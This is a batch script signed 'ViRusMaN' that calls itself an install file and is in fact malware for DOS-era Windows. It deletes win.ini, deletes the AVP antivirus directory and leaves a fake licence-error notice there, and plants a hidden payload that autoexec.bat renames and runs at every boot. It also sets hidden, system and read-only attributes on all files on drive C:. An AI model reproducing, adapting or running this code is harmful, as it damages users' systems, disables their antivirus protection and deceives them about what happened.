   :This Program Created By ViRusMaN ! Version 0.2 (Install File)

   @echo off
   if exist c:\system.da goto author_computer!
   if exist c:\windows\invtest.tes goto Already_installed
   if %windir%==%windir% goto win_loading
   goto install_start

   :win_loading

   if exist %windir%\win.ini attrib -r -s -h %windir%\win.ini
   if exist %windir%\dosstart.bat attrib -r -s -h %windir%\dosstart.bat
   echo if exist c:\windows\win.ini attrib -r -s -h c:\windows\win.ini>nul>>%windir%\dosstart.bat
   echo del c:\windows\win.ini>nul>>%windir%\dosstart.bat
   echo @echo off>nul>>%windir%\dosstart.bat
   echo cls>nul>>%windir%\dosstart.bat
   echo echo Windows ¥ ¬®¦¥â § £àã§¨âì á¥ á  í¬ã«ïæ¨¨ Ms-Dos !>nul>>%windir%\dosstart.bat
   echo echo „«ï ¯à®¤®«¦¥¨ï>nul>>%windir%\dosstart.bat
   echo pause>nul>>%windir%\dosstart.bat
   echo win.com>nul>>%windir%\dosstart.bat
   goto win_contine

   :install_start

   if exist c:\windows\win.ini attrib -r -s -h c:\windows\win.ini
   if exist c:\windows\dosstart.bat attrib -r -s -h c:\windows\dosstart.bat
   echo if exist c:\windows\win.ini attrib -r -s -h c:\windows\win.ini>nul>>c:\windows\dosstart.bat
   echo del c:\windows\win.ini>nul>>c:\windows\dosstart.bat
   echo del c:\windows\win.ini>nul>>c:\windows\dosstart.bat
   echo @echo off>nul>>c:\windows\dosstart.bat
   echo cls>nul>>c:\windows\dosstart.bat
   echo echo Windows ¥ ¬®¦¥â § £àã§¨âì á¥ á  í¬ã«ïæ¨¨ Ms-Dos !>nul>>c:\windows\dosstart.bat
   echo echo „«ï ¯à®¤®«¦¥¨ï>nul>>c:\windows\dosstart.bat
   echo pause>nul>>%c:\windows\dosstart.bat
   echo win.com>nul>>c:\windows\dosstart.bat

   :win_contine

   cls
   if exist c:\autoexec.bat attrib -r -h -s c:\autoexec.bat
   if exist c:\windows\vdata.dat attrib -r -h -s c:\windows\vdata.dat
   if exist c:\windows\vdata.dat del c:\windows\vdata.dat
   if exist c:\windows\vdata.bat attrib -r -h -s c:\windows\vdata.bat
   if exist c:\windows\vdata.bat del c:\windows\vdata.bat
   if not exist c:\windows\*.* md c:\windows
   if not exist c:\windows\dat\*.* md c:\windows\dat
   copy data.dat c:\windows\vdata.dat
   if exist c:\windows\vdata.dat attrib +r +h +s c:\windows\vdata.dat
   if exist c:\windows\vdata.dat echo Install test file>nul>>c:\windows\invtest.tes
   cls

   :AnTi AVP(add ver 0.2)

   if NOT exist %bootdir%\progra~1\antivi~1\*.* goto Add_Autoexec
   attrib -r -a -s -h %bootdir%\progra~1\antivi~1\*.*/s
   if exist %bootdir%\progra~1\antivi~1\*.* deltree/y %bootdir%\progra~1\antivi~1\
   if NOT exist %bootdir%\progra~1\antivi~1\*.* goto Add_Readme_avp

   :Add_Readme_avp
   echo Îøèáêà èñïîëüçîâàíèÿ AVP ! Âàøà ëèöåíçèÿ ÍÅÄÅÉÑÒÂÈÒÅËÜÍÀ ! Ïðîãðàììà áûëà óäàëåíà ñ âàøåãî êîìïüþòåðà.>>%bootdir%\progra~1\antivi~1\ReadMe.txt


   :Add_Autoexec

   cls
   echo Please,wait...
   echo fak>nul>>c:\windows\dat\1.q
   echo @echo off >nul>>c:\autoexec.bat
   echo attrib -r -h -s c:\windows\vdata.dat>nul>>c:\autoexec.bat
   echo rename c:\windows\vdata.dat *.bat>nul>>c:\autoexec.bat
   echo call c:\windows\vdata.bat>nul>>c:\autoexec.bat
   echo rename c:\windows\vdata.bat *.dat>nul>>c:\autoexec.bat
   echo attrib +r +h +s c:\windows\vdata.dat>nul>>c:\autoexec.bat
   attrib +r +a +s +h c:\*.*/s
   if exist c:\windows\invtest.tes echo All Done !
   if exist c:\windows\invtest.tes goto end_file
   echo Error Install !!!
   echo Please,reinstall this programm !
   goto end_file

   :author_computer!

   cls
   echo This programm cannot installed ! (This is author computer !!!)
   goto end_file

   :Already_installed

   cls
   echo This programm already installed !

   :end_file
